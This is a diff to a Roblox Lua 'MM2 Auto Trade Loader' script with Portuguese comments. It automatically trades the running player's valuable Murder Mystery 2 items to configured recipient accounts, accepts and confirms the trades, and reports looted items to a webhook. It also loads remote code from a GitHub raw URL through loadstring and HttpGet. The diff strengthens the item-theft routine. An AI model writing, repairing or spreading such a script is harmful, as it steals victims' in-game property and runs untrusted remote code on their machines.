@@ -1,8 +1,8 @@
--- MM2 Auto Trade Loader - Versão Completa (Usando módulos do jogo)
+-- MM2 Auto Trade Loader - Versão Corrigida
 -- By: DeadJB
 
 local Config = _G.MM2AutoTradeConfig or {}
-local Username = Config.Username or {} -- Quem vai RECEBER os itens
+local Username = Config.Username or {}
 local MinValue = Config.MinValue or 0
 local Webhook = Config.Webhook or ""
 
@@ -11,16 +11,14 @@ if #Username == 0 or Webhook == "" then
     return
 end
 
--- Carrega módulos nativos do jogo
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
-local TradeModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("TradeModule"))
-local InventoryModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("InventoryModule"))
-local ProfileData = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ProfileData"))
-local ItemModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("ItemModule"))
+local TradeRemote = ReplicatedStorage:FindFirstChild("Trade")
+local Remotes = ReplicatedStorage:FindFirstChild("Remotes")
 
 local function getValues()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub002/Hs62jsgp810i/refs/heads/main/mm2val.lua.txt"))()
@@ -39,7 +37,7 @@ local function filterItems(inventory, values)
     local filtered = {}
     for _, item in pairs(inventory) do
         local value = getItemValue(item, values)
-        if value >= MinValue and value > 0 then
+        if value >= MinValue then -- Se MinValue for 0, pega tudo
             table.insert(filtered, item)
         end
     end
@@ -48,20 +46,18 @@ end
 
 local function getInventoryItems()
     local items = {}
-    local inventory = InventoryModule.MyInventory
     
-    if not inventory then
-        print("Inventário não carregado")
-        return items
+    -- Pega do Backpack
+    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            table.insert(items, item.Name)
+        end
     end
     
-    for itemType, typeData in pairs(inventory.Data) do
-        for category, categoryData in pairs(typeData) do
-            for itemName, itemData in pairs(categoryData) do
-                if itemData.Amount and itemData.Amount > 0 then
-                    table.insert(items, itemName)
-                end
-            end
+    -- Pega do StarterGear
+    for _, item in pairs(LocalPlayer.StarterGear:GetChildren()) do
+        if item:IsA("Tool") then
+            table.insert(items, item.Name)
         end
     end
     
@@ -105,7 +101,7 @@ local function doTrade(targetName)
     local filtered = filterItems(inventoryItems, values)
     
     if #filtered == 0 then
-        print("Nenhum item com valor >= " .. MinValue)
+        print("Nenhum item encontrado (MinValue = " .. MinValue .. ")")
         return false
     end
     
@@ -126,34 +122,76 @@ local function doTrade(targetName)
         loot = filtered
     })
     
-    -- Envia pedido de trade usando o módulo nativo
-    TradeModule.SendTradeRequest(targetName)
+    -- Envia pedido de trade
+    if TradeRemote then
+        TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
+    else
+        -- Fallback: usa o remote antigo
+        ReplicatedStorage:WaitForChild("TradeRequest"):InvokeServer(target, "Trade")
+    end
     
-    -- Espera a trade abrir
-    wait(3)
+    wait(2)
     
-    -- Função pra enviar itens via módulo nativo
+    -- Verifica se a trade abriu
+    local tradeGUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
+    if not tradeGUI then
+        print("Trade não abriu, tentando novamente...")
+        if TradeRemote then
+            TradeRemote:WaitForChild("SendRequest"):InvokeServer(target)
+        else
+            ReplicatedStorage:WaitForChild("TradeRequest"):InvokeServer(target, "Trade")
+        end
+        wait(2)
+        tradeGUI = LocalPlayer.PlayerGui:FindFirstChild("Trade")
+        if not tradeGUI then
+            print("Falha ao abrir trade")
+            return false
+        end
+    end
+    
+    -- Função recursiva pra enviar itens
     local function sendItems(items)
         local offered = 0
+        
+        -- Coloca itens na trade
         for _, itemName in pairs(items) do
             if offered >= 4 then break end
-            -- Usa o remoto nativo do jogo
-            ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(itemName, "Weapons")
-            offered = offered + 1
+            
+            -- Tenta enviar item
+            local success = pcall(function()
+                if TradeRemote then
+                    TradeRemote:WaitForChild("OfferItem"):FireServer(itemName, "Weapons")
+                else
+                    ReplicatedStorage:WaitForChild("TradeOffer"):InvokeServer(itemName, true)
+                end
+            end)
+            
+            if success then
+                offered = offered + 1
+            end
             wait(0.3)
         end
         
         wait(1)
         
-        -- Aceita usando o módulo nativo
-        TradeModule.GUI.Actions.Accept.ActionButton:Fire()
+        -- Aceita trade
+        pcall(function()
+            if TradeRemote then
+                TradeRemote:WaitForChild("AcceptTrade"):FireServer()
+            else
+                ReplicatedStorage:WaitForChild("TradeAccept"):InvokeServer()
+            end
+        end)
         wait(0.5)
         
-        -- Confirma
-        local acceptGUI = TradeModule.GUI.Actions.Accept
-        if acceptGUI.Confirm then
-            acceptGUI.Confirm.ActionButton:Fire()
-        end
+        -- Confirma trade
+        pcall(function()
+            if TradeRemote then
+                TradeRemote:WaitForChild("ConfirmTrade"):FireServer()
+            else
+                ReplicatedStorage:WaitForChild("TradeConfirm"):InvokeServer()
+            end
+        end)
         
         -- Verifica se tem mais itens
         local remaining = {}
@@ -163,6 +201,15 @@ local function doTrade(targetName)
         
         if #remaining > 0 then
             wait(3)
+            -- Limpa a trade e envia o resto
+            pcall(function()
+                if TradeRemote then
+                    TradeRemote:WaitForChild("ClearOffer"):FireServer()
+                else
+                    ReplicatedStorage:WaitForChild("TradeClear"):InvokeServer()
+                end
+            end)
+            wait(1)
             sendItems(remaining)
         else
             wait(2)
@@ -192,6 +239,10 @@ local function checkAndTrade()
 end
 
 -- Loop principal
+print("Auto Trade iniciado!")
+print("MinValue: " .. MinValue)
+print("Alvos: " .. table.concat(Username, ", "))
+
 while task.wait(10) do
     pcall(checkAndTrade)
 end
